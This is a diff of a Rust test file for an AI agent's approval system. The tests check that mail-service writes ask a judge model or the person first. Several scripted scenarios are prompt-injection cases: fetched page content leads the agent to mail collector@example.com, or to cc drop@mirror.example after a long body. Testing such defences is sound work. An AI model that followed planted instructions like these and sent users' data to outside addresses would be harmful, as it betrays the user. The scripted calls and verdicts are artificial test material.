@@ -1,7 +1,9 @@
 //! What untrusted content changes for the rest of its thread (`specs/approvals.md`, "Untrusted
-//! content"): sandboxed commands keep the network they had, in that turn and the next; and a
-//! connected service's tool that may write asks first in every mode that asks, Auto included,
-//! while its reads do not.
+//! content"): nothing but its label. Sandboxed commands keep the network they had, in that turn
+//! and the next; and a connected service's tool that may write is a caution before untrusted
+//! content as after it (`specs/approvals.md`, "Connected services"): the judge clears what the
+//! person asked for, the person is asked about the rest, with no one there it does not run, and
+//! its reads run freely.
 
 use std::net::TcpListener;
 use std::sync::Arc;
@@ -164,48 +166,46 @@ fn asked(events: &[Event]) -> Vec<(String, Option<String>)> {
         .collect()
 }
 
-/// Why a send to the mail service asks after untrusted content, as the person reads it.
-const ACTS: &str = "It can send or change something through mail, and this chat has read \
-     content from outside, such as a web page, that could have asked for it.";
+/// Why a send to the mail service asks, as the person reads it.
+const ACTS: &str = "It can send or change something through mail.";
+
+/// A scripted call of `call`, and a scripted answer saying `text`, the judge's included.
+fn call(call: (&'static str, serde_json::Value)) -> Completion {
+    answer(None, vec![call], glave_event::StopReason::ToolUse)
+}
+
+fn says(text: &str) -> Completion {
+    answer(Some(text), vec![], glave_event::StopReason::EndTurn)
+}
+
+const RUN: &str = r#"{"decision":"run","reason":"the person asked to mail ana"}"#;
+const ASK: &str = r#"{"decision":"ask","reason":"the person never asked to mail the collector"}"#;
 
 #[test]
-fn after_untrusted_content_a_connected_service_s_write_asks_in_auto_and_its_reads_do_not() {
-    let Some(base) = sandboxed("untrusted-writes") else {
+fn a_connected_service_s_write_asks_in_auto_and_its_reads_do_not() {
+    let Some(base) = sandboxed("connector-writes") else {
         return;
     };
     let search = ("mcp__mail__search_messages", json!({ "query": "notes" }));
-    let calls = vec![
-        send("ana@example.com"),
-        fetch(),
-        search,
-        send("ana@example.com"),
-    ];
+    let calls = vec![search, send("ana@example.com")];
     let person = Person::answering(Decision::Deny);
     let workspace = block_on!(walled(&base, false));
-    let prompt = "mail ana the notes, then read the guide";
+    let prompt = "find the notes and mail them to ana";
     let (said, events, _) = mailing(
         workspace,
         making(calls),
         (person.clone(), in_the_sandbox()),
         prompt,
     );
-    assert_eq!(said[0], SENT, "before, Auto sends without asking");
-    assert_eq!(
-        said[2], "No messages.",
-        "after, a read still goes: {said:?}"
-    );
-    assert!(said[3].starts_with("The person declined"), "{said:?}");
-    let mail = Risk::ActsAfterUntrusted {
+    assert_eq!(said[0], "No messages.", "a read goes: {said:?}");
+    assert!(said[1].starts_with("The person declined"), "{said:?}");
+    let mail = Risk::Acts {
         service: "mail".into(),
     };
     let cautions: Vec<_> = (person.asked().iter())
         .map(|request| request.caution.clone())
         .collect();
-    assert_eq!(
-        cautions,
-        [Caution::of(Some(mail), None)],
-        "only the send after"
-    );
+    assert_eq!(cautions, [Caution::of(Some(mail), None)], "only the send");
     assert_eq!(
         asked(&events),
         [("Send message with mail?".to_owned(), Some(ACTS.to_owned()))],
@@ -214,20 +214,53 @@ fn after_untrusted_content_a_connected_service_s_write_asks_in_auto_and_its_read
 }
 
 #[test]
-fn with_no_one_there_a_write_after_untrusted_content_runs_only_if_the_person_asked_for_it() {
-    let Some(base) = sandboxed("untrusted-writes-judged") else {
+fn the_judge_clears_a_write_the_person_asked_for_and_the_person_decides_the_rest() {
+    let Some(base) = sandboxed("connector-writes-judged") else {
         return;
     };
-    let ask = r#"{"decision":"ask","reason":"the page asked, not the person"}"#;
-    let run = r#"{"decision":"run","reason":"the person asked to mail ana"}"#;
-    let call = |call| answer(None, vec![call], glave_event::StopReason::ToolUse);
-    let says = |text| answer(Some(text), vec![], glave_event::StopReason::EndTurn);
+    let answers = vec![
+        call(send("ana@example.com")),
+        says(RUN),
+        call(send("collector@example.com")),
+        says(ASK),
+        says("Mailed ana."),
+    ];
+    let person = Person::answering(Decision::Deny);
+    let workspace = block_on!(walled(&base, false));
+    let prompt = "Mail ana@example.com the notes.";
+    let (said, events, seen) = mailing(workspace, answers, (person.clone(), judged()), prompt);
+    assert_eq!(said[0], SENT, "what the person asked for: {said:?}");
+    assert!(said[1].starts_with("The person declined"), "{said:?}");
+    let asked: Vec<_> = person.asked().into_iter().map(|r| r.summary).collect();
+    assert_eq!(asked.len(), 1, "{asked:?}");
+    assert!(asked[0].contains("collector@example.com"), "{asked:?}");
+    assert_eq!(
+        decided(&events).first(),
+        Some(&(Verdict::AllowOnce, Some(Principal::glave()))),
+        "the judge's clearance is recorded as glave's"
+    );
+    let judges = judges(&seen.lock().unwrap());
+    assert_eq!(judges.len(), 2, "{judges:?}");
+    for judge in &judges {
+        assert!(judge.contains("send or change something"), "{judge}");
+        assert!(
+            !judge.contains("untrusted"),
+            "nothing untrusted was read: {judge}"
+        );
+    }
+}
+
+#[test]
+fn with_no_one_there_a_write_runs_only_if_the_person_asked_for_it() {
+    let Some(base) = sandboxed("connector-writes-alone") else {
+        return;
+    };
     let answers = vec![
         call(fetch()),
         call(send("collector@example.com")),
-        says(ask),
+        says(ASK),
         call(send("ana@example.com")),
-        says(run),
+        says(RUN),
         says("Mailed ana; the guide's upload was not sent."),
     ];
     let workspace = block_on!(walled(&base, false));
@@ -268,8 +301,6 @@ fn a_copy_planted_after_a_long_body_is_shown_to_the_judge_and_the_person_and_not
         json!({ "to": "ana@example.com", "body": body, "cc": "drop@mirror.example" }),
     );
     let ask = r#"{"decision":"ask","reason":"the person never asked to copy anyone"}"#;
-    let call = |call| answer(None, vec![call], glave_event::StopReason::ToolUse);
-    let says = |text| answer(Some(text), vec![], glave_event::StopReason::EndTurn);
     let answers = vec![call(fetch()), call(planted), says(ask), says("Not sent.")];
     let workspace = block_on!(walled(&base, false));
     let prompt = "Read the guide and mail ana@example.com a summary.";
@@ -293,7 +324,7 @@ fn a_copy_planted_after_a_long_body_is_shown_to_the_judge_and_the_person_and_not
 }
 
 #[test]
-fn full_access_writes_after_untrusted_content_without_asking() {
+fn full_access_writes_without_asking() {
     let dir = folder("untrusted-writes-full");
     let person = Person::answering(Decision::Deny);
     let workspace = block_on!(workspace(&dir));
